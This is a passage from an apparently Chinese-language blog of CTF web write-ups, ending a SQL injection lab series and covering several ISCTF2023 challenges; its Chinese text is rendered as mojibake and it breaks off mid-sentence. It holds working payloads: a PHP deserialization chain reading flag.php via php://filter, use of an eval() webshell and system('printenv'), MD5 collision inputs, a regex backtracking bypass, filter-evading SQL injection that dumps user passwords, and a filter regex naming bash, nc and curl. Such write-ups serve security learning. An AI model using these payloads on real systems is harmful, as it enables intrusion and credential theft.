class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1  æ­£å¸¸<br>?<span class="hljs-attribute">id</span>=1&quot;  æ­£å¸¸<br>?<span class="hljs-attribute">id</span>=2&quot;  æ­£å¸¸<br>?<span class="hljs-attribute">id</span>=1&quot;--+  æ­£å¸¸<br>?<span class="hljs-attribute">id</span>=;/&#x27;;[]<span class="hljs-string">&#x27;    æŠ¥é”™ &#x27;</span> ;/<span class="hljs-string">&#x27;;[]&#x27;</span><span class="hljs-string">&#x27;) LIMIT 0,1 &#x27;</span><br>           <br>åˆ¤æ–­æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œé—­åˆæ–¹å¼æ˜¯<span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>å…¶ä½™åŒä¸Š</p><h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><p>ç»è¿‡è¿™å‡ é¢˜çš„æµ‹è¯•å‘ç°è¾“å…¥?id&#x3D;\æŠ¥é”™èƒ½å¸®æˆ‘ä»¬åˆ¤æ–­å‡ ä¹å…¨éƒ¨çš„é—­åˆæ–¹å¼ï¼Œä¸ç¡®å®šæ˜¯å¦ä¸ºä¸€ç‰¹æ€§<br>ä¾‹<br>æœ¬é¢˜</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=\<br></code></pre></td></tr></table></figure><p><img src="/images/DU24U0QGA8FZKHQMEE5LD.png"><br>å¯åˆ¤æ–­é—­åˆæ–¹å¼ä¸º\åçš„<code>&quot;)</code><br>ä¸‹é¢åŒä¸Šé¢˜</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF2023</title>
    <link href="/2023/12/01/ISCTF2023/"/>
    <url>/2023/12/01/ISCTF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="åœ£æ¯æˆ˜äº‰ï¼ï¼ï¼"><a href="#åœ£æ¯æˆ˜äº‰ï¼ï¼ï¼" class="headerlink" title="åœ£æ¯æˆ˜äº‰ï¼ï¼ï¼"></a>åœ£æ¯æˆ˜äº‰ï¼ï¼ï¼</h2><p>ååºåˆ—åŒ–é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸ºSaberé€‰æ‹©äº†å¯¹çš„æ­¦å™¨!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è“„åŠ›!å’–å–±æ£’ï¼ï¼&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;èƒœåˆ©ï¼&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Rider</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å¼€å§‹å¬å”¤ä»è€…ï¼&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„ååºåˆ—åŒ–é¢˜<br>å…ˆæ‰¾åˆ°includeæ¥ä¸ªä¼ªåè®®<br>ç„¶åæ‰¾ä¸‹ä¸€ä¸ªï¼Œ__invokeéœ€è¦è¢«å½“æˆå‡½æ•°è°ƒç”¨æ‰ä¼šè§¦å‘<br>é‚£å°±newä¸€ä¸ªprepare<br>èµ‹å€¼ç»™releace<br>ä½†å®ƒçš„__Getæ–¹æ³•è¿˜æ²¡è§¦å‘ï¼Œæ‰¾ä¸‹ä¸€ä¸ª<br>__getæ˜¯è°ƒç”¨çš„æˆå‘˜å±æ€§æ˜¯ç§æœ‰å±æ€§æˆ–ä¸å­˜åœ¨æ—¶è§¦å‘<br>æ‰¾åˆ°artifactä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œnewä¸€ä¸‹<br>èµ‹å€¼excalibuerï¼Œè€Œarrowè´Ÿè´£è°ƒç”¨__get<br>è€Œ__tostringéœ€è¦è¡¨è¾¾æ–¹å¼é”™è¯¯å¯¼è‡´é­”æœ¯æ–¹æ³•è§¦å‘ï¼ˆæŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²è°ƒç”¨ï¼‰<br>echoæ˜¯è¾“å‡ºå­—ç¬¦ä¸²çš„<br>æ‰€ä»¥newä¸€ä¸ªsummon<br>saberèµ‹å€¼ä¸ºsummon</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new saber();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">weapon</span>=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-variable">$b</span>=new prepare();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">release</span>=<span class="hljs-variable">$a</span>;//è°ƒç”¨äº†__invoke<br><span class="hljs-variable">$c</span>=new artifact();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">excalibuer</span>=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">arrow</span>=<span class="hljs-string">&#x27;123&#x27;</span>;//è°ƒç”¨äº†__get<br><span class="hljs-variable">$d</span>=new summon();<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-attribute">Saber</span>=<span class="hljs-variable">$c</span>;//echo è°ƒç”¨äº†__toString<br>echo serialize(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><h2 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flagä¸€åˆ†ä¸º3ï¼Œæ•£è½åœ¨å„å¤„ï¼Œåˆ†åˆ«æ˜¯ï¼šxxxxxxxxã€xxxxã€xxxã€‚</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//æ ‡å‡†ä¸€å¥è¯æœ¨é©¬~</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ—¢ç„¶éƒ½è¿™ä¹ˆå†™äº†ï¼Œé‚£ä¹ˆç›´æ¥èšå‰‘è¿æ¥çœäº‹çš„å¤š<br>ç¬¬ä¸€æ®µflagåœ¨flag.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;FLAG1:ISCTF&#123;6ced&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ®µflagåœ¨æ ¹ç›®å½•ä¸­</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6033</span><span class="hljs-string">-a4ec-</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ®µflagæ‰¾äº†å¾ˆå¤šæ–‡ä»¶éƒ½æ²¡æ‰¾åˆ°<br>åœ¨æ ¹ç›®å½•é‡Œå‘ç°äº†ä¸€ä¸ªå†’çº¢å…‰çš„æ–‡ä»¶<br><img src="/images/KX28RD7MM3K2B26.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sed -i <span class="hljs-string">&quot;s/&#123;&#123;FLAG1&#125;&#125;/<span class="hljs-variable">$&#123;FLAG:0:10&#125;</span>/&quot;</span> /var/www/localhost/htdocs/flag.php<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;FLAG:10:10&#125;</span> &gt; /flag2<br><span class="hljs-built_in">export</span> FLAG3=<span class="hljs-variable">$&#123;FLAG:20&#125;</span><br>FLAG3=<span class="hljs-variable">$&#123;FLAG:20&#125;</span><br><span class="hljs-built_in">export</span> FLAG=<span class="hljs-string">&quot;flag&quot;</span><br>FLAG=<span class="hljs-string">&quot;flag&quot;</span><br>httpd -D FOREGROUND<br></code></pre></td></tr></table></figure><p>exportæ˜¯åˆ›å»ºä¸€ä¸ªç¯å¢ƒå˜é‡çš„æ„æ€<br>çœ‹æ¥ç¬¬ä¸‰æ®µflagåœ¨ç¯å¢ƒå˜é‡ä¸­<br>å›åˆ°é¡µé¢æ‰§è¡Œå‘½ä»¤</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;printenv&#x27;</span>);<br><span class="hljs-regexp">//</span><span class="hljs-variable constant_">HOSTNAME</span>=d38fc96b0fdf <span class="hljs-variable constant_">SHLVL</span>=<span class="hljs-number">2</span> <span class="hljs-variable constant_">HOME</span>=<span class="hljs-regexp">/root FLAG3=4f5c-bb37-ee81a5ecc139&#125; PATH=/usr</span><span class="hljs-regexp">/local/sbin</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span> <span class="hljs-variable constant_">PWD</span>=<span class="hljs-regexp">/var/www</span><span class="hljs-regexp">/localhost/htdocs</span> <span class="hljs-variable constant_">FLAG</span>=flag<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿›ä½ çš„å¿ƒé‡Œ"><a href="#ç»•è¿›ä½ çš„å¿ƒé‡Œ" class="headerlink" title="ç»•è¿›ä½ çš„å¿ƒé‡Œ"></a>ç»•è¿›ä½ çš„å¿ƒé‡Œ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$str</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pan_gu&#x27;</span>];<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zhurong&#x27;</span>];<br><span class="hljs-variable">$lida1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hongmeng&#x27;</span>];<br><span class="hljs-variable">$lida2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shennong&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$lida1</span> !== <span class="hljs-variable">$lida2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$lida1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$lida2</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5ç»•è¿‡äº†!&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä½ å¹²å˜›?å“å“Ÿ!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†æƒ³æƒ³!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&#x27;2023ISCTF&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å°±å·®ä¸€ç‚¹ç‚¹å•¦!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifæ˜¯md5å¼ºç¢°æ’</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">hongmeng<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;shennong<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><p>preg_matchæ•°ç»„ç»•è¿‡å³å¯</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?z</span>hurong[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æœ€åpreg_matchç”¨å›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡<br>åœ¨2023ISCTFå‰é¢åŠ ä¸Šå¥½å¤šä¸ªa</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1000000</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¹ˆå¤šaå°±å¤Ÿäº†ğŸ˜Š</p><h2 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h2><p>çœ‹åˆ°æºç ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å¯ä»¥xä¸€ä¸‹çš„<br>è¯•äº†å¾ˆä¹…æ²¡åŠæ³•ç»•è¿‡å®ä½“ç¼–ç <br>é‚£å°±sqlæ³¨å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p>é€šè¿‡é”™è¯¯å›æ˜¾çœ‹åˆ°äº†orè¢«è¿‡æ»¤å“©<br><img src="/images/LXOOWXC0IPUM2L.png"><br>è€Œä¸”ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨%09ä»£æ›¿<br><img src="/images/JUZPUNGKP7244PBVB.png"><br>åŒå†™æˆåŠŸç»•è¿‡</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">çˆ†åº“<br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>database()#<br>//users<br>çˆ†è¡¨<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>group_concat(table_name)<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>infoorrmation_schema.tables<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>table_schema<span class="hljs-operator">=</span>database()#<br>//users<br>çˆ†å­—æ®µ<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>group_concat(column_name)<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>infoorrmation_schema.columns<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>table_name<span class="hljs-operator">=</span>&#x27;users&#x27;#<br>//ç”¨æˆ·$USER<span class="hljs-punctuation">,</span>CURRENT_CONNECTIONS<span class="hljs-punctuation">,</span>TOTAL_CONNECTIONS<span class="hljs-punctuation">,</span>user<span class="hljs-punctuation">,</span>password$ç™»å½•æˆåŠŸ<br>çˆ†å€¼<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>passwoorrd<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>users#<br>//<span class="hljs-number">21232</span>f<span class="hljs-number">297</span>a<span class="hljs-number">57</span>a<span class="hljs-number">5</span>a<span class="hljs-number">743894</span>a<span class="hljs-number">0e4</span>a<span class="hljs-number">801</span>fc<span class="hljs-number">3</span>ï¼šadminçš„md<span class="hljs-number">5</span>åŠ å¯†å€¼<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>passwoorrd<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>users<span class="hljs-variable">%09</span>limit<span class="hljs-variable">%092</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>#<br>//ç”¨æˆ·$ISCTF&#123;<span class="hljs-keyword">c</span><span class="hljs-number">51</span>a<span class="hljs-number">3</span>cf<span class="hljs-number">4</span>-adf<span class="hljs-number">5</span><span class="hljs-number">-4</span>cd<span class="hljs-number">5</span><span class="hljs-number">-80</span>f<span class="hljs-number">3</span><span class="hljs-number">-30</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-keyword">c</span><span class="hljs-number">3262</span>bd&#125;$ç™»å½•æˆåŠŸ<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨è”åˆæ³¨å…¥æœ‰ç‚¹é—®é¢˜ï¼Œæ˜¾ç¤ºçš„ä¸å…¨ï¼Œè¿™é¢˜ç”¨æŠ¥é”™æ³¨å…¥è¦ç›´è§‚å¾ˆå¤š</p><h2 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<span class="hljs-comment">//strings</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æƒ³è¯»æˆ‘æ–‡ä»¶ï¼Ÿå¤§èƒ†ã€‚&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ— å­—æ¯æ•°å­—RCEï¼Ÿå¤§èƒ†ï¼&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¥‡æŠ€æ·«å·§ï¼Ÿå¤§èƒ†ï¼ï¼&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤§èƒ†ï¼ï¼ï¼&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>åˆšå¼€å§‹æŠŠè¿™é¢˜æƒ³æ­ªäº†ï¼Œä¸€é¡¿æ— å‚rceã€‚ã€‚ã€‚<br>è¿™é¢˜å”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯ 